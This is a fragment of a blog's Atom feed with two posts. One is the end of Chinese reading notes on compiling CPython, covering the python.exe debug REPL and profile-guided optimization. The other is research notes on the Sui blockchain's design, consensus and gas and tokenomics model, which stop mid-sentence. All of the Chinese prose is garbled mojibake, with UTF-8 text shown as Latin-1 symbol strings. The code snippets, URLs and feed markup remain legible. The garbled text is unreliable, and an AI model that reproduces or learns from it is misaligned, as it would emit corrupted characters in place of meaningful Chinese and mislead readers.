çš„è°ƒè¯•äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ‰§è¡Œ <code>python.exe</code> ä»¥æŸ¥çœ‹æœ‰æ•ˆçš„ REPLï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python.exe</span><br><span class="line">Python 3.9.0b1 (tags/v3.9.0b1:97fe9cf, May 19 2020, 10:00:00)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>æ˜¯çš„ï¼Œæ²¡é”™ï¼ŒmacOS ç‰ˆæœ¬çš„æ–‡ä»¶æ‰©å±•åä¸º <code>.exe</code>ã€‚ è¿™ä¸ªæ‰©å±•<em>ä¸æ˜¯</em>å› ä¸ºå®ƒæ˜¯ Windows äºŒè¿›åˆ¶æ–‡ä»¶ï¼å› ä¸º macOS æœ‰ä¸€ä¸ªä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå¼€å‘äººå‘˜ä¸å¸Œæœ›äººä»¬ä¸å°å¿ƒå¼•ç”¨ <code>Python/</code> ç›®å½•ï¼Œå› æ­¤é™„åŠ äº† <code>.exe</code> ä»¥é¿å…æ­§ä¹‰ã€‚å¦‚æœä½ ç¨åè¿è¡Œ <code>make install</code> æˆ– <code>make altinstall</code>ï¼Œå®ƒå°†åœ¨å°†æ–‡ä»¶å®‰è£…åˆ°ä½ çš„ç³»ç»Ÿä¹‹å‰å°†æ–‡ä»¶é‡å‘½åå› pythonã€‚</p></blockquote><h2><span id="pei-zhi-wen-jian-yin-dao-you-hua">é…ç½®æ–‡ä»¶å¼•å¯¼ä¼˜åŒ–</span></h2><p>macOSã€Linux å’Œ Windows æ„å»ºè¿‡ç¨‹å…·æœ‰â€œPGOâ€æˆ–â€œProfile Guided Optimizationâ€æ ‡å¿—ã€‚PGO ä¸æ˜¯ Python å›¢é˜Ÿåˆ›å»ºçš„ä¸œè¥¿ï¼Œè€Œæ˜¯è®¸å¤šç¼–è¯‘å™¨çš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬ CPython ä½¿ç”¨çš„ç¼–è¯‘å™¨ã€‚</p><p>PGO çš„å·¥ä½œæ–¹å¼æ˜¯è¿›è¡Œåˆå§‹ç¼–è¯‘ï¼Œç„¶åé€šè¿‡è¿è¡Œä¸€ç³»åˆ—æµ‹è¯•æ¥åˆ†æåº”ç”¨ç¨‹åºã€‚ç„¶ååˆ†æåˆ›å»ºçš„é…ç½®æ–‡ä»¶ï¼Œç¼–è¯‘å™¨å°†å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ›´æ”¹ä»¥æé«˜æ€§èƒ½ã€‚</p><p>å¯¹äº CPythonï¼Œåˆ†æé˜¶æ®µè¿è¡Œ <code>python -m test --pgo</code>ï¼Œå®ƒæ‰§è¡Œåœ¨ <code>Lib/test/libregrtest/pgo.py</code> ä¸­æŒ‡å®šçš„å›å½’æµ‹è¯•ã€‚è¿™äº›æµ‹è¯•æ˜¯ä¸“é—¨é€‰æ‹©çš„ï¼Œå› ä¸ºå®ƒä»¬ä½¿ç”¨å¸¸ç”¨çš„ C æ‰©å±•æ¨¡å—æˆ–ç±»å‹ã€‚</p><blockquote><p>PGO è¿‡ç¨‹éå¸¸è€—æ—¶ï¼Œå› æ­¤åœ¨æ•´æœ¬ä¹¦ä¸­ï¼Œæˆ‘å°†å…¶æ’é™¤åœ¨æ¨èæ­¥éª¤åˆ—è¡¨ä¹‹å¤–ï¼Œä»¥ç¼©çŸ­ç¼–è¯‘æ—¶é—´ã€‚å¦‚æœè¦å°†è‡ªå®šä¹‰ç¼–è¯‘ç‰ˆæœ¬çš„ CPython åˆ†å‘åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåˆ™åº”åœ¨ Linux å’Œ macOS ä¸­ä½¿ç”¨ <code>--with-pgo</code> æ ‡å¿—è¿è¡Œ <code>./configure</code>ï¼Œå¹¶åœ¨ Windows ä¸Šä½¿ç”¨ <code>--pgo</code> æ ‡å¿—è¿è¡Œ <code>build.bat</code>ã€‚</p></blockquote><p>ç”±äºä¼˜åŒ–ç‰¹å®šäºæ‰§è¡Œé…ç½®æ–‡ä»¶çš„å¹³å°å’Œæ¶æ„ï¼Œå› æ­¤æ— æ³•åœ¨æ“ä½œç³»ç»Ÿæˆ– CPU æ¶æ„ä¹‹é—´å…±äº« PGO é…ç½®æ–‡ä»¶ã€‚<a href="http://python.org">python.org</a> ä¸Šçš„ CPython å‘è¡Œç‰ˆå·²ç»é€šè¿‡ PGOï¼Œæ‰€ä»¥å¦‚æœä½ åœ¨ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šè¿è¡ŒåŸºå‡†æµ‹è¯•ï¼Œå®ƒä¼šæ¯”ä» <a href="http://python.org">python.org</a> ä¸‹è½½çš„è¦æ…¢ã€‚</p><p>Windowsã€macOS å’Œ Linux é…ç½®æ–‡ä»¶å¼•å¯¼çš„ä¼˜åŒ–åŒ…æ‹¬ä»¥ä¸‹æ£€æŸ¥å’Œæ”¹è¿›ï¼š</p><ul><li><strong>å‡½æ•°å†…è”</strong> â”€â”€ å¦‚æœå‡½æ•°è¢«å¦ä¸€ä¸ªå‡½æ•°å®šæœŸè°ƒç”¨ï¼Œé‚£ä¹ˆå®ƒå°†è¢«â€œå†…è”â€ä»¥å‡å°‘å †æ ˆå¤§å°ã€‚</li><li><strong>è™šæ‹Ÿè°ƒç”¨æ¨æµ‹å’Œå†…è”</strong> â”€â”€ å¦‚æœä¸€ä¸ªè™šæ‹Ÿå‡½æ•°è°ƒç”¨é¢‘ç¹åœ°é’ˆå¯¹æŸä¸ªå‡½æ•°ï¼ŒPGO å¯ä»¥æ’å…¥ä¸€ä¸ªæœ‰æ¡ä»¶æ‰§è¡Œçš„å¯¹è¯¥å‡½æ•°çš„ç›´æ¥è°ƒç”¨ã€‚ç„¶åå¯ä»¥å†…è”ç›´æ¥è°ƒç”¨ã€‚</li><li><strong>å¯„å­˜å™¨åˆ†é…ä¼˜åŒ–</strong> â”€â”€ åŸºäºé…ç½®æ–‡ä»¶æ•°æ®ç»“æœï¼ŒPGO å°†ä¼˜åŒ–å¯„å­˜å™¨åˆ†é…ã€‚</li><li><strong>åŸºæœ¬å—ä¼˜åŒ–</strong> â”€â”€ åŸºæœ¬å—ä¼˜åŒ–å…è®¸åœ¨ç»™å®šå¸§å†…ä¸´æ—¶æ‰§è¡Œçš„å…±åŒæ‰§è¡Œçš„åŸºæœ¬å—æ”¾ç½®åœ¨åŒä¸€ç»„é¡µé¢ï¼ˆå±€éƒ¨æ€§ï¼‰ä¸­ã€‚å®ƒæœ€å¤§é™åº¦åœ°å‡å°‘äº†ä½¿ç”¨çš„é¡µé¢æ•°é‡ï¼Œä»è€Œæœ€å¤§é™åº¦åœ°å‡å°‘äº†å†…å­˜å¼€é”€ã€‚</li><li><strong>çƒ­ç‚¹ä¼˜åŒ–</strong> â”€â”€ ç¨‹åºèŠ±è´¹æœ€å¤šæ‰§è¡Œæ—¶é—´çš„å‡½æ•°å¯ä»¥ä¼˜åŒ–é€Ÿåº¦ã€‚</li><li><strong>å‡½æ•°å¸ƒå±€ä¼˜åŒ–</strong> â”€â”€ åœ¨åˆ†æè°ƒç”¨å›¾ä¹‹åï¼Œå€¾å‘äºæ²¿ç€ç›¸åŒæ‰§è¡Œè·¯å¾„çš„å‡½æ•°è¢«ç§»åŠ¨åˆ°ç¼–è¯‘åº”ç”¨ç¨‹åºçš„åŒä¸€éƒ¨åˆ†ã€‚</li><li><strong>æ¡ä»¶åˆ†æ”¯ä¼˜åŒ–</strong> - PGO å¯ä»¥æŸ¥çœ‹å†³ç­–åˆ†æ”¯ï¼Œå¦‚ <code>if..else if</code> æˆ– <code>switch</code> è¯­å¥ï¼Œå¹¶æ‰¾å‡ºæœ€å¸¸ç”¨çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <code>switch</code> è¯­å¥ä¸­æœ‰ 10 ä¸ª <code>case</code>ï¼Œå…¶ä¸­ä¸€ä¸ªä½¿ç”¨äº† 95% çš„æ—¶é—´ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«ç§»åˆ°é¡¶éƒ¨ï¼Œä»¥ä¾¿åœ¨ä»£ç è·¯å¾„ä¸­ç«‹å³æ‰§è¡Œã€‚</li><li><strong>æ­»ç‚¹åˆ†ç¦»</strong> â”€â”€ åœ¨ PGO æœŸé—´æœªè°ƒç”¨çš„ä»£ç è¢«ç§»åŠ¨åˆ°åº”ç”¨ç¨‹åºçš„å•ç‹¬éƒ¨åˆ†ã€‚</li></ul><h2><span id="jie-lun">ç»“è®º</span></h2><p>åœ¨æœ¬ç« ä¸­ï¼Œä½ å·²ç»äº†è§£äº†å¦‚ä½•å°† CPython æºä»£ç ç¼–è¯‘æˆå¯å·¥ä½œçš„è§£é‡Šå™¨ã€‚åœ¨æ¢ç´¢å’Œæ”¹ç¼–æºä»£ç æ—¶ï¼Œä½ å¯ä»¥åœ¨æ•´æœ¬ä¹¦ä¸­ä½¿ç”¨è¿™äº›çŸ¥è¯†ã€‚</p><p>åœ¨ä½¿ç”¨ CPython æ—¶ï¼Œä½ å¯èƒ½éœ€è¦é‡å¤ç¼–è¯‘æ­¥éª¤æ•°åæ¬¡ç”šè‡³æ•°ç™¾æ¬¡ã€‚å¦‚æœä½ å¯ä»¥è°ƒæ•´ä½ çš„å¼€å‘ç¯å¢ƒæ¥åˆ›å»ºé‡æ–°ç¼–è¯‘çš„å¿«æ·æ–¹å¼ï¼Œæœ€å¥½ç°åœ¨å°±è¿™æ ·åšï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå¤§é‡æ—¶é—´ã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals ç¬”è®° â”€â”€ ç¼–è¯‘ Python
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>Sui å…¬é“¾ç ”ç©¶æ•´ç†</title>
    <link href="https://qiwihui.com/qiwihui-blog-162/"/>
    <id>https://qiwihui.com/qiwihui-blog-162/</id>
    <published>2024-05-15T02:25:31.355Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å®˜ç½‘ï¼š<a href="https://sui.io/">https://sui.io/</a></p><p>ç™½çš®ä¹¦ï¼š<a href="https://github.com/MystenLabs/sui/blob/main/doc/paper/sui.pdf">https://github.com/MystenLabs/sui/blob/main/doc/paper/sui.pdf</a></p><span id="more"></span><h2><span id="ji-zhu">æŠ€æœ¯</span></h2><p>æ°´å¹³å¯æ‰©å±•æ€§ï¼Œé«˜ååï¼Œä½å»¶è¿Ÿã€‚</p><p>æŠ€æœ¯ç‰¹å¾ï¼š</p><ol><li>å˜ä½“ Move è¯­è¨€<ol><li>å®‰å…¨ç‰¹æ€§ï¼ˆå†…å­˜å®‰å…¨ï¼ŒMove Proverï¼‰</li><li>ç¼–ç¨‹èŒƒå¼ï¼šè™½ç„¶å¤§å¤šæ•°åŒºå—é“¾çš„å­˜å‚¨éƒ½ä»¥å¸æˆ·ä¸ºä¸­å¿ƒï¼Œä½† Sui çš„å­˜å‚¨æ˜¯å›´ç»•å¯¹è±¡è®¾è®¡çš„ã€‚æ¯ä¸ªå¯¹è±¡ç”±ä¸€ä¸ªåœ°å€æ‰€æ‹¥æœ‰ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯å˜ï¼Œä¹Ÿå¯è®¾ä¸ºä¸å¯å˜æˆ–åœ¨å¤šä¸ªåœ°å€ä¹‹é—´å…±äº«ã€‚Sui çš„ Move æ™ºèƒ½åˆçº¦å¯ä»¥æ¥æ”¶è¿™äº›å¯¹è±¡ä½œä¸ºè¾“å…¥ï¼Œå¯¹å…¶è¿›è¡Œæ“ä½œï¼Œå¹¶å°†å¯¹è±¡ä½œä¸ºè¾“å‡ºè¿”å›ã€‚è¿™æ˜¯ä¸€ç§å®Œå…¨ä¸åŒäº Solidity æˆ– Rust çš„æ™ºèƒ½åˆçº¦ç¼–ç¨‹èŒƒå¼ï¼Œæ›´å…·è¡¨ç°åŠ›ï¼Œå¯¹äºåŠ¨æ€NFTå’ŒåŠ å¯†æ¸¸æˆçš„æ•°å­—å¯¹è±¡è¡¨è¾¾æ›´ç®€å•ã€‚</li><li>æ”¹å–„ç½‘ç»œæ€§èƒ½å¹¶ç®€åŒ–å¼€å‘äººå‘˜ä½“éªŒ</li><li>ç›¸è¾ƒäºSolidityï¼Œè¾ƒå°‘ç»å†é¡¹ç›®éªŒè¯ï¼Œç¼ºå°‘å®‰å…¨å®è·µã€‚</li></ol></li><li>äº¤æ˜“å¹¶è¡ŒåŒ–<ol><li>å¯¹äºé“¾ä¸Šçš„å¤§å¤šæ•°äº¤æ˜“éƒ½ä¸ä¼šä¸å…¶ä»–äº¤æ˜“ç«äº‰ç›¸åŒçš„èµ„æº(ä¾‹å¦‚å¯¹åŒä¸€ä¸ªNFTå‘èµ·ä¸¤ç¬”äº¤æ˜“)ï¼ŒæŒ‰ç›®å‰å…¬é“¾çš„è®¾è®¡ï¼ˆä¾‹å¦‚ETHï¼‰ï¼Œéœ€è¦å¯¹ä¸€ä¸ªæ€»çš„æ’åºäº¤æ˜“åˆ—è¡¨æ¥è¿›è¡Œå…¨èŠ‚ç‚¹çš„å…±è¯†ç¡®è®¤ï¼Œå› æ­¤é€ æˆäº†å¤§é‡çš„è®¡ç®—æµªè´¹ã€‚</li><li>Suiä¸è¦æ±‚å…¨åºï¼Œåªè¦æ»¡è¶³å› æœå…³ç³»çš„äº¤æ˜“é¡ºåºæ‰§è¡Œå³å¯ï¼Œæ²¡æœ‰å› æœå…³ç³»çš„äº¤æ˜“å¯ä»¥è¢«Suiçš„éªŒè¯å™¨ä»¥ä»»æ„é¡ºåºæ‰§è¡Œã€‚</li></ol></li><li>å¯æ‰©å±•æ€§<ol><li>å› ä¸ºä¸è¦æ±‚äº¤æ˜“æ»¡è¶³å…¨åºï¼Œåªè¦æ±‚äº¤æ˜“æ»¡è¶³å› æœé¡ºåºã€‚</li><li>ä½¿ç”¨ Narwhal å…±è¯†æœºåˆ¶æ¥å…¨æ’åºåŒ…å«å…±äº«å¯¹è±¡çš„äº¤æ˜“</li><li>æ°´å¹³æ‰©å±•ï¼Œå¤šæœºå™¨åˆ†ç‰‡ï¼Œå¯ä»¥é€šè¿‡ç»™éªŒè¯èŠ‚ç‚¹å¢åŠ è®¾å¤‡æ¥æå‡åå</li></ol></li><li>å…±è¯†æœºåˆ¶<ul><li>æ‹œå åº­å¼ä¸€è‡´å¹¿æ’­ï¼Œç”¨äºç‹¬ç«‹çš„äº¤æ˜“</li><li>BFT å…±è¯†ï¼ˆ+åŸºäº DAG çš„ mempoolï¼‰ï¼Œç”¨äºæœ‰ä¾èµ–å…³ç³»çš„äº¤æ˜“ï¼ˆå…±äº«å¯¹è±¡ï¼‰</li><li>å…±è¯†ç®—æ³•ä¸“æ³¨äºå°½é‡å‡å°‘éªŒè¯èŠ‚ç‚¹ä¹‹é—´å¤„ç†äº¤æ˜“æ‰€éœ€çš„é€šä¿¡ã€‚</li></ul></li></ol><h2><span id="token-jing-ji-xue">Token ç»æµå­¦</span></h2><h3><span id="gai-kuang">æ¦‚å†µ</span></h3><p>ä»£å¸ç»æµç™½çš®ä¹¦ï¼š<a href="https://github.com/MystenLabs/sui/blob/main/doc/paper/tokenomics.pdf">The Sui Smart Contracts Platform: Economics and Incentives</a></p><p>ä»£å¸ï¼šSUI</p><p>æ€»ä¾›åº”é‡ï¼š 100äº¿ï¼Œåˆ†é…ç»™åˆ›å§‹å›¢é˜Ÿã€æŠ•èµ„è€…ã€å…¬å”®ã€Sui åŸºé‡‘ä¼šå’Œæœªæ¥çš„é‡Šæ”¾ã€‚</p><p>ä»£å¸ä½œç”¨ï¼š</p><ul><li>è´¨æŠ¼/ä¿æŠ¤ç½‘ç»œ</li><li>äº¤æ˜“è´¹</li><li>æ²»ç†</li><li>è´¦æˆ·å•ä½/äº¤æ˜“ä¸­ä»‹</li></ul><p>è§’è‰²ï¼š</p><ul><li>ç”¨æˆ·ï¼šä½¿ç”¨ Sui å¹³å°è¿›è¡Œäº¤æ˜“ï¼Œä»¥åˆ›å»ºï¼Œä¿®æ”¹å’Œè½¬ç§»æ•°å­—èµ„äº§æˆ–ä¸åŸºäºæ™ºèƒ½åˆçº¦ï¼Œäº’æ“ä½œæ€§ï¼Œå¯ç»„åˆæ€§çš„å¤æ‚åº”ç”¨è¿›è¡Œäº¤äº’ï¼›</li><li>SUIä»£å¸æŒæœ‰è€…ï¼šå¯é€‰æ‹©å°†å…¶ä»£å¸å§”æ‰˜ç»™éªŒè¯è€…å¹¶å‚ä¸æƒç›Šè¯æ˜æœºåˆ¶ï¼ˆPOSï¼‰ã€‚SUI æ‰€æœ‰è€…ä¹Ÿæ‹¥æœ‰å‚ä¸ Sui æ²»ç†çš„æƒåˆ©</li><li>éªŒè¯è€…ï¼šè¿›è¡Œ Sui å…¬é“¾ä¸Šçš„äº‹åŠ¡å¤„ç†å’Œæ‰§è¡Œ</li></ul><p>äº”ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p><ul><li>SUI ä»£å¸æ˜¯ Sui å¹³å°çš„åŸç”Ÿèµ„äº§ã€‚</li><li>æ‰€æœ‰ç½‘ç»œæ“ä½œéƒ½æ”¶å– Gas è´¹ï¼Œç”¨äºå¥–åŠ±æƒç›Šè¯æ˜æœºåˆ¶çš„å‚ä¸è€…ï¼Œé˜²æ­¢åƒåœ¾ä¿¡æ¯å’Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</li><li>Sui çš„å­˜å‚¨åŸºé‡‘ç”¨äºè·¨æ—¶é—´è½¬ç§»æƒç›Šå¥–åŠ±ï¼Œå¹¶è¡¥å¿æœªæ¥éªŒè¯è€…å…ˆå‰å­˜å‚¨çš„é“¾ä¸Šæ•°æ®çš„å­˜å‚¨æˆæœ¬ã€‚</li><li>æƒç›Šè¯æ˜æœºåˆ¶ PoS ç”¨äºé€‰æ‹©ã€æ¿€åŠ±å’Œå¥–åŠ± Sui å¹³å°æ“ä½œè€…ï¼ˆå³éªŒè¯è€…å’Œ SUI å§”æ‰˜äººï¼‰çš„è¯šå®è¡Œä¸ºã€‚</li><li>é“¾ä¸ŠæŠ•ç¥¨ç”¨äºæ²»ç†å’Œåè®®å‡çº§ã€‚</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/181870355-c7269c0d-7969-4ea9-a3c3-9610c2238a63.png" alt="sui-token-economics"></p><h3><span id="gas-ding-jie-mo-xing">Gaså®šä»·æ¨¡å‹</span></h3><p>ä¸ºç”¨æˆ·æä¾›<strong>å¯é¢„æµ‹</strong>çš„<strong>ä½çš„</strong>äº¤æ˜“è´¹ç”¨ã€æ¿€åŠ±éªŒè¯è€…ä¼˜åŒ–å…¶äº¤æ˜“å¤„ç†æ“ä½œä»¥åŠé˜²æ­¢æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><p>Gas è´¹ç”¨åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šè®¡ç®—æ‰§è¡Œè´¹ç”¨å’Œå­˜å‚¨è´¹ç”¨ï¼Œå¹¶ä¸ºä¸¤éƒ¨åˆ†è´¹ç”¨åˆ†åˆ«è®¡ä»·ã€‚</p><p>è®¡ç®—ä»·æ ¼å®šä»·æœºåˆ¶ï¼š</p><ul><li>Sui ä»¥çºªå…ƒä¸ºå•ä½è¿è¡Œï¼Œæ¯ä¸ªçºªå…ƒï¼ˆ24 å°æ—¶ï¼‰éªŒè¯èŠ‚ç‚¹é›†éƒ½ä¼šæ”¹å˜ã€‚æ–°çºªå…ƒçš„éªŒè¯èŠ‚ç‚¹ä¼šå°±æ•´ä¸ªçºªå…ƒçš„å‚è€ƒ Gas è´¹è¿›è¡ŒæŠ•ç¥¨ã€‚è¯¥åè®®ä¼šæä¾›ä¸€äº›æ¿€åŠ±æªæ–½ï¼Œé¼“åŠ±éªŒè¯èŠ‚ç‚¹åœ¨æ•´ä¸ªçºªå…ƒå°†äº¤æ˜“è´¹ç”¨ä¿æŒåœ¨æ¥è¿‘å‚è€ƒä»·æ ¼çš„æ°´å¹³ã€‚å…·ä½“è¿‡ç¨‹ä¸ºï¼š<ol><li>åœ¨æ¯ä¸ªçºªå…ƒå¼€å§‹æ—¶ï¼Œéœ€è¦æ¯ä¸ªéªŒè¯è€…æäº¤ä¸€ä¸ª gas æŠ¥ä»·ï¼ˆå³æ¯ä¸ªéªŒè¯è€…æ„¿æ„å¤„ç†äº¤æ˜“çš„æœ€ä½gasä»·æ ¼)ï¼ŒSuiå°†ä¼šæŠŠæ€»gasæŠ¥ä»·åˆ—è¡¨ä¸­2/3ä½ç½®å¤„çš„ä»·æ ¼è®¾ç½®ä¸ºè¿™ä¸ªçºªå…ƒçš„å‚è€ƒgasä»·æ ¼ï¼Œä¾‹å¦‚æ€»å…±æœ‰ 100 ä¸ªéªŒè¯è€…è€…æä¾›äº† gas æŠ¥ä»·ï¼Œå°†æ‰€æœ‰çš„ gas æŠ¥ä»·è¿›è¡Œä½åˆ°é«˜æ’åºï¼Œå…¶ä¸­ç¬¬ 67 ä½éªŒè¯è€…æä¾›çš„ gas æŠ¥ä»·å³ä¸ºæœ¬çºªå…ƒçš„å‚è€ƒ gas ä»·æ ¼</li><li>åœ¨ç”¨æˆ·æäº¤äº¤æ˜“æ—¶ï¼Œå¯æŒ‰å‚è€ƒ gas ä»·æ ¼è¿›è¡Œ gas ä»·æ ¼è®¾ç½®ï¼Œä½†ç”±äºæ¯ä¸ªç”¨æˆ·ä¹ æƒ¯ä¸ä¸€è‡´å’Œé“¾ä¸Šç½‘ç»œçš„æ³¢åŠ¨æƒ…å†µï¼Œå› æ­¤æœ€ç»ˆå®é™…çš„ gas ä»·æ ¼ä¼šä¸å‚è€ƒ gas ä»·æ ¼æœ‰ä¸€ç‚¹çš„å‡ºå…¥ã€‚</li><li>åœ¨æ¯ä¸ªçºªå…ƒç»“æŸæ—¶ï¼Œä¼šæ ¹æ®æ¯ä¸ªéªŒè¯è€…æ‰§è¡Œçš„å®é™… gas ä»·æ ¼æƒ…å†µè¿›è¡Œå¥–åŠ±çš„åˆ†é…ï¼Œåœ¨çºªå…ƒå¼€å§‹æ—¶æäº¤ä½ä»·æŠ¥ä»·ï¼ˆå³ä½äºå‚è€ƒä»·æ ¼ï¼‰æˆ–å¤„ç†å®é™… gas ä»·æ ¼é«˜äºå…¶ gas æŠ¥ä»·äº¤æ˜“çš„éªŒè¯è€…ä¼šè·å¾—æ›´é«˜çš„å¥–åŠ±ã€‚ç›¸åï¼Œåœ¨çºªå…ƒå¼€å§‹æ—¶æäº¤é«˜ä»·æŠ¥ä»·ï¼ˆå³é«˜äºå‚è€ƒä»·æ ¼ï¼‰æˆ–å¤„ç†å®é™… gas ä»·æ ¼ä½äºå…¶ gas æŠ¥ä»·çš„éªŒè¯è€…å°†å—åˆ°å¥–åŠ±å‡å°‘çš„æƒ©ç½šã€‚</li></ol></li><li>é€šè¿‡è¿™å¥—æœºåˆ¶ï¼Œä¸€æ˜¯é¼“åŠ±éªŒè¯è€…é™ä½å…¶ gas ä»·æ ¼çš„æŠ¥ä»·ï¼ŒäºŒæ˜¯è®©ç”¨æˆ·æœ‰ä¸€ä¸ªå‚è€ƒä»·æ ¼ä¾›å…¶å‚è€ƒï¼Œä¿è¯ç”¨æˆ·è®¾ç½®æ¥è¿‘å‚è€ƒä»·æ ¼çš„ gas çš„äº¤æ˜“èƒ½å¤Ÿå¾—åˆ°åŠæ—¶çš„å¤„ç†ã€‚</li></ul><p>å­˜å‚¨ä»·æ ¼ï¼š</p><ul><li>é€šè¿‡æ²»ç†ææ¡ˆè®¾ç½®ï¼Œå¹¶ä¸ç»å¸¸æ›´æ–°ã€‚ç›®çš„æ˜¯é€šè¿‡å°†è¿™äº›è´¹ç”¨å­˜å…¥å­˜å‚¨åŸºé‡‘ï¼Œç„¶åå°†è¿™äº›è´¹ç”¨é‡æ–°åˆ†é…ç»™æœªæ¥çš„éªŒè¯è€…ï¼Œç¡®ä¿ Sui ç”¨æˆ·ä¸ºå…¶ä½¿ç”¨é“¾ä¸Šæ•°æ®å­˜å‚¨ä»˜è´¹ã€‚ ä¸è®¡ç®— gas ä»·æ ¼ç›¸æ¯”ï¼Œå­˜å‚¨ä»·æ ¼æ˜¯å›ºå®šçš„ï¼Œå¹¶ä¸”å¯¹äºä¸€ä¸ªçºªå…ƒå†…å’Œè·¨çºªå…ƒçš„æ‰€æœ‰äº¤æ˜“éƒ½æ˜¯é€šç”¨çš„ï¼Œç›´åˆ°å­˜å‚¨ä»·æ ¼æ›´æ–°ã€‚</li></ul><p>ç½‘ç»œå µå¡æœŸé—´ Gas è´¹å¦‚ä½•ä¿æŒåœ¨ä½ä½ï¼šå› ä¸ºç½‘ç»œçš„ååé‡ä¸æ›´å¤šçš„å‚ä¸è€…æˆçº¿æ€§å…³ç³»ï¼ŒéªŒè¯èŠ‚ç‚¹å¯ä»¥æ ¹æ®ç½‘ç»œéœ€æ±‚çš„å¢åŠ æŒ‰æ¯”ä¾‹å¢åŠ æ›´å¤šçš„å‚ä¸è€…ï¼Œä»¥æ­¤ä½¿ Gas ä»·æ ¼æ¥è¿‘å‚è€ƒä»·æ ¼ã€‚</p><p>å­˜å‚¨åŸºé‡‘ï¼š</p><ul><li>è§£å†³çŠ¶æ€é€šèƒ€ï¼ˆstate bloatï¼‰é—®é¢˜</li><li>Sui çš„ä¸€ä¸ªå…³é”®ç‰¹æ€§æ˜¯å®ƒèƒ½å¤Ÿå¤„ç†ä»»æ„æ•°é‡çš„é“¾ä¸Šæ•°æ®ï¼Œä½†å´éœ€è¦è¶³å¤Ÿå¤šçš„å­˜å‚¨èµ„æºæ¥è¿›è¡Œæ”¯æŒã€‚å› æ­¤ç”¨æˆ·åœ¨è¿›è¡Œæ¯ç¬”äº¤æ˜“æ—¶ï¼Œåœ¨å½“ä¸‹å³æ”¯ä»˜äº†ä¸€ç¬”å­˜å‚¨è´¹ç”¨åˆ°å­˜å‚¨åŸºé‡‘ï¼Œå­˜å‚¨åŸºé‡‘å°†ä¼šä½¿ç”¨è¿™ç¬”èµ„é‡‘æ¥å¥–åŠ±æœªæ¥çš„éªŒè¯è€…ï¼Œå› ä¸ºæœªæ¥çš„éªŒè¯è€…ä¹Ÿä¸ºå½“ä¸‹ç”¨æˆ·æ•°æ®çš„å­˜å‚¨ä»˜å‡ºäº†æˆæœ¬ï¼ˆå³éªŒè¯è€…éœ€è¦å­˜å‚¨å…¨è´¦æœ¬ï¼‰ã€‚å½“é“¾ä¸Šå­˜å‚¨è¦æ±‚å¾ˆé«˜æ—¶ï¼ŒéªŒè¯è€…ä¼šè·å¾—å¤§é‡é¢å¤–å¥–åŠ±ä»¥è¡¥å¿å…¶æˆæœ¬ã€‚å½“å­˜å‚¨è¦æ±‚è¾ƒä½æ—¶ï¼Œåä¹‹äº¦ç„¶ã€‚</li><li>ä»é•¿è¿œæ¥çœ‹ï¼Œéšç€æŠ€æœ¯æ”¹è¿›å¯¼è‡´å­˜å‚¨æˆæœ¬ä¸‹é™å’Œ SUI ä»£å¸ä»·æ ¼çš„å˜åŒ–ï¼Œæ²»ç†ææ¡ˆå°†æ›´æ–°å­˜å‚¨ gas ä»·æ ¼ä»¥åæ˜ å…¶æ–°çš„ç›®æ ‡ä»·æ ¼ã€‚</li><li>Sui çš„å­˜å‚¨æ¨¡å‹åŒ…æ‹¬ä¸€ä¸ªâ€œåˆ é™¤é€‰é¡¹â€ï¼Œç”¨æˆ·åœ¨åˆ é™¤ä¹‹å‰å­˜å‚¨çš„é“¾ä¸Šæ•°æ®ï¼ˆä¾‹å¦‚ NFT çš„å…ƒæ•°æ®ï¼‰æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥é€‰é¡¹è·å¾—å­˜å‚¨è´¹å›æ‰£ï¼ˆå³ä»ä¹‹å‰æ”¯ä»˜çš„å­˜å‚¨ gas ä¸­è¿”å›ä¸€ç¬”èµ„é‡‘ï¼Œå› ä¸ºè‡ªå·±çš„æ•°æ®æ— éœ€å†è¿›è¡Œå­˜å‚¨ï¼‰ã€‚</li></ul><h3><span id="pos-wei-tuo-mo-xing">PoS å§”æ‰˜æ¨¡å‹</span></h3><p>SUI æŒæœ‰è€…å¯ä»¥å°†è‡ªå·±çš„ SUI 